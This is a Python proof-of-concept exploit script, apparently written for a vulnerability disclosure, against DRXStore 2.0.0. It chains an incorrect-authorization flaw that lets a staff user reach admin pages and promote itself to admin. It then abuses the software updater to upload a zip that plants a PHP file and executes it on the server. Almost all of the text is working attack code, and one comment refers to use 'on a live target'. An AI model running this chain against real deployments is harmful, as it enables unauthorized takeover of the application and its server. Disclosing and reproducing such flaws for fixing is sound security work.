#!/usr/bin/env python3
"""
DRXStore 2.0.0 - staff -> admin -> RCE proof of concept
CWE-863 Incorrect Authorization (requireAdmin() never checks the role)

Runs against a FRESH instance (setup wizard not yet completed).
Start the app first:   php -S 127.0.0.1:8899 -t /path/to/drxstore
Then:                  python3 poc.py http://127.0.0.1:8899

Tested on macOS, PHP 8.5.5, JSON storage driver.
"""
import http.cookiejar, io, json, os, re, sys, urllib.error, urllib.parse, urllib.request, uuid, zipfile

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8899").rstrip("/")

# App directory is needed so the "update" package carries the real index.php/config/app.php
# instead of placeholders (the updater requires both files to locate the package root).
def find_app_dir():
    for cand in (sys.argv[2] if len(sys.argv) > 2 else None,
                 os.environ.get("DRX_APP"),
                 os.path.expanduser("~/cve-hunt/repro/app"),
                 os.path.expanduser("~/cve-hunt/candidates2/drxstore")):
        if cand and os.path.exists(os.path.join(cand, "config", "app.php")):
            return cand
    return ""


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


class Client:
    def __init__(self):
        handlers = [urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()), NoRedirect()]
        proxy = os.environ.get("http_proxy") or os.environ.get("HTTP_PROXY")
        if proxy:
            # explicit handler: env-based proxying can silently bypass 127.0.0.1
            handlers.insert(0, urllib.request.ProxyHandler({"http": proxy}))
        self.op = urllib.request.build_opener(*handlers)

    def req(self, path, data=None, raw=None, ctype=None):
        if raw is not None:
            r = urllib.request.Request(BASE + path, data=raw, method="POST",
                                       headers={"Content-Type": ctype})
        else:
            body = urllib.parse.urlencode(data).encode() if data else None
            r = urllib.request.Request(BASE + path, data=body,
                                       method="POST" if data else "GET")
        try:
            resp = self.op.open(r, timeout=60)
            return resp.getcode(), resp.read().decode("utf8", "ignore")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf8", "ignore")
        except urllib.error.URLError as e:
            sys.exit(f"""
[!] Cannot reach {BASE} ({e.reason})

    poc.py is only the CLIENT. The vulnerable app has to be running first.
    Open a second terminal and start it:

        APP=~/cve-hunt/repro/app
        rm -rf "$APP" && mkdir -p "$APP"
        cp -R ~/cve-hunt/repro/src/. "$APP/"
        mkdir -p "$APP/data/uploads" && chmod -R 777 "$APP/data"
        rm -f "$APP"/data/*.json
        php -S 127.0.0.1:8901 -t "$APP"

    Then re-run this script. See REPRODUCE.md step 2.""")


def csrf(html):
    m = re.search(r'name="csrf_token"\s+value="([a-f0-9]+)"', html)
    return m.group(1) if m else None


def login(c, user, pw):
    _, h = c.req("/index.php?p=login")
    return c.req("/index.php?p=login", {"csrf_token": csrf(h), "login": user, "password": pw})


def setup(c):
    _, h = c.req("/index.php?p=setup")
    if not csrf(h):
        print("[i] setup already complete, skipping wizard"); return
    c.req("/index.php?p=setup", {"csrf_token": csrf(h), "step": "1",
        "store_name": "POC Pharmacy", "store_email": "poc@example.test",
        "store_address": "x", "store_phone": "1", "store_gst": "", "store_dl": "",
        "currency": "$"})
    _, h = c.req("/index.php?p=setup&step=2")
    c.req("/index.php?p=setup", {"csrf_token": csrf(h), "step": "2",
        "full_name": "Admin", "username": "admin", "email": "admin@example.test",
        "password": "AdminPass123", "confirm": "AdminPass123"})
    _, h = c.req("/index.php?p=setup&step=3")
    c.req("/index.php?p=setup", {"csrf_token": csrf(h), "step": "3", "driver": "json"})
    _, h = c.req("/index.php?p=setup&step=4")
    c.req("/index.php?p=setup", {"csrf_token": csrf(h), "step": "4"})
    print("[+] setup complete (admin/AdminPass123)")


def main():
    proxy = urllib.request.getproxies().get("http")
    if proxy:
        print(f"[i] routing through proxy {proxy}  (Burp: Proxy > HTTP history)")
    else:
        print("[i] direct connection (no http proxy set). For Burp: export http_proxy=http://127.0.0.1:8080")
    boot = Client(); setup(boot)

    # ---- admin creates a plain staff account (the realistic deployment)
    adm = Client(); login(adm, "admin", "AdminPass123")
    _, h = adm.req("/index.php?p=users")
    adm.req("/index.php?p=users", {"csrf_token": csrf(h), "action": "add_staff",
        "name": "Staff One", "username": "staff1", "email": "staff1@example.test",
        "password": "StaffPass123", "role": "staff"})
    print("[+] staff account created: staff1 / StaffPass123 (role=staff)")

    st = Client(); login(st, "staff1", "StaffPass123")
    print("[+] logged in as staff1\n")

    print("--- [1] staff reaches admin-only pages (STAFF_ALLOWED_PAGES excludes them) ---")
    for page in ("users", "settings", "sw_update", "reports"):
        code, body = st.req(f"/index.php?p={page}")
        print(f"    GET ?p={page:10s} -> {code}  len={len(body)}")

    _, h = st.req("/index.php?p=users")
    has_selector = 'name="role"' in h
    print(f"    role selector present: {has_selector}\n")

    print("--- [2] staff promotes itself to admin ---")
    st.req("/index.php?p=users", {"csrf_token": csrf(h), "action": "edit_staff", "id": "2",
        "name": "Staff One", "username": "staff1", "email": "staff1@example.test",
        "password": "", "role": "admin"})
    code, body = st.req("/index.php?p=users")
    promoted = bool(re.search(r"staff1.*?Admin|>\s*Admin\s*<", body, re.S))
    print(f"    POST edit_staff role=admin -> {code}; page now lists staff1 as Admin: {promoted}\n")

    print("--- [3] staff -> RCE through the software updater ---")
    buf = io.BytesIO()
    appdir = find_app_dir()
    if appdir:
        print(f"    (package built from {appdir})")
    else:
        print("    [!] no app dir found - package uses placeholder index.php/config/app.php")
        print("        pass it as 2nd arg:  poc.py <url> ~/cve-hunt/repro/app")
    def real(rel):
        p = os.path.join(appdir, rel)
        return open(p, encoding="utf8", errors="ignore").read() if appdir and os.path.exists(p) else "<?php // placeholder\n"
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("drxstore/index.php", real("index.php"))
        z.writestr("drxstore/config/app.php", real("config/app.php"))
        z.writestr("drxstore/poc_shell.php",
                   '<?php echo "RCE_OK:".(6*6)."|php=".PHP_VERSION; ?>')
        zi = zipfile.ZipInfo("drxstore/assets/pad.bin"); zi.compress_type = zipfile.ZIP_STORED
        z.writestr(zi, os.urandom(70000))          # updater rejects packages under 50 KB
    pkg = buf.getvalue()

    _, h = st.req("/index.php?p=sw_update")
    b = "----poc" + uuid.uuid4().hex
    parts = [
        f'--{b}\r\nContent-Disposition: form-data; name="csrf_token"\r\n\r\n{csrf(h)}\r\n'.encode(),
        f'--{b}\r\nContent-Disposition: form-data; name="action"\r\n\r\nupload_update\r\n'.encode(),
        f'--{b}\r\nContent-Disposition: form-data; name="update_zip"; filename="update.zip"\r\n'
        f'Content-Type: application/zip\r\n\r\n'.encode() + pkg + b"\r\n",
        f"--{b}--\r\n".encode()]

    # NOTE: the placeholder index.php/config/app.php above are only used to satisfy the
    # package layout check; on a live target copy the real ones instead so the app survives.
    code, resp = st.req("/index.php?p=sw_update", raw=b"".join(parts),
                        ctype=f"multipart/form-data; boundary={b}")
    print(f"    upload -> {code}; confirm page: {'Apply Update' in resp}")
    if "Apply Update" not in resp:
        print("    [!] upload rejected - check package size/layout"); return

    code, resp = st.req("/index.php?p=sw_update",
                        {"csrf_token": csrf(resp), "action": "apply_update"})
    print(f"    apply  -> {code}")
    code, out = st.req("/poc_shell.php")
    print(f"    GET /poc_shell.php -> {code}  {out.strip()[:80]}")


if __name__ == "__main__":
    main()
